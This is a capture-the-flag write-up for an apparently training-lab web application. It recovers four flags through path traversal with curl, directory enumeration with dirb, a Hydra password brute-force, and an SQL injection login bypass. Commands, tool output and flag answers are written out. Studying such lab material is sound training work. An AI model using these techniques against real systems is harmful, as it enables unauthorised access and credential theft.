## Tasks

![](Web%20Application%20Penetration%20Testing%20CTF%201/screens/0.png)

---
## Flag 1

> _Sometimes, important files are hidden in plain sight. Check the root ('/') directory for a file named 'flag.txt' that might hold the key to the first flag._

The application exposes a `view_file` endpoint that takes a `file` parameter, vulnerable to a Local File Inclusion (LFI) / path traversal vulnerability. The parameter is tested with a `../` traversal sequence to escape the web root and reach the filesystem root:

```
curl -s http://target.ine.local/view_file?file=../../../flag.txt | grep "FLAG"
    <pre>FLAG1_61bb81f77f934c02badb0bd4cb9aebc4
```

```
FLAG1_61bb81f77f934c02badb0bd4cb9aebc4
```

---
## Flag 2

> _Explore the structure of the server's directories. Enumeration might reveal hidden treasures._

Directory brute-forcing with `dirb` against the web root reveals four endpoints, including `/secured` which redirects (HTTP 308):

```
dirb http://target.ine.local -w /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jun 16 02:11:55 2026
URL_BASE: http://target.ine.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://target.ine.local/ ----
+ http://target.ine.local/about    (CODE:200|SIZE:2858)
+ http://target.ine.local/login    (CODE:200|SIZE:3377)
+ http://target.ine.local/logout   (CODE:302|SIZE:189)
+ http://target.ine.local/secured  (CODE:308|SIZE:251)

-----------------
END_TIME: Tue Jun 16 02:11:59 2026
DOWNLOADED: 4612 - FOUND: 4
```

A `flag.txt` file is served directly from the `/secured` path:

```
curl -s http://target.ine.local/secured/flag.txt
FLAG2_029e01a941c5439ab3a1b9612d385990
```

---
## Flag 3

> _The login form seems a bit weak. Trying out different combinations might just reveal the next flag._

The login form at `/login` submits credentials via HTTP POST:

![](Web%20Application%20Penetration%20Testing%20CTF%201/screens/2.png)

Inspecting the failure response reveals the string `Invalid` is returned on bad credentials, which becomes the failure condition for Hydra's `http-post-form` module:

```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /root/Desktop/wordlists/100-common-passwords.txt \
      target.ine.local \
      http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-16 01:56:48
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1700 login tries (l:17/p:100), ~107 tries per task
[DATA] attacking http-post-form://target.ine.local:80/login:username=^USER^&password=^PASS^:F=Invalid
[80][http-post-form] host: target.ine.local   login: guest   password: butterfly1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-16 01:57:10
```

Logging in as `guest:butterfly1` lands on the User Profile page, which exposes the flag in the `Secret String` field:

![](Web%20Application%20Penetration%20Testing%20CTF%201/screens/3.png)

```
FLAG3_3d7b1b8507734fbea02bb538782d2c2d
```

---
## Flag 4

> _The login form behaves oddly with unexpected inputs. Think of injection techniques to access the 'admin' account and find the flag._

The login form passes credentials directly into a SQL query without sanitisation. Submitting a classic SQL injection payload as the username causes the backend to authenticate as `admin` without requiring a valid password:

![](Web%20Application%20Penetration%20Testing%20CTF%201/screens/4.png)

The authenticated session lands directly on the admin User Profile page, revealing the flag in the `Secret String` field:

![](Web%20Application%20Penetration%20Testing%20CTF%201/screens/5.png)

```
FLAG4_4c79b73fde69464f899dbafbae541503
```

---

## Summary

| #   | Technique                                            | Flag                                     |     |
| --- | ---------------------------------------------------- | ---------------------------------------- | --- |
| 1   | Path traversal (LFI) via `view_file` parameter       | `FLAG1_61bb81f77f934c02badb0bd4cb9aebc4` |     |
| 2   | Directory enumeration (`dirb`) → `/secured/flag.txt` | `FLAG2_029e01a941c5439ab3a1b9612d385990` |     |
| 3   | HTTP POST form brute-force (`guest:butterfly1`)      | `FLAG3_3d7b1b8507734fbea02bb538782d2c2d` |     |
| 4   | SQL injection login bypass (`admin' or '1'='1`)      | `FLAG4_4c79b73fde69464f899dbafbae541503` |     |
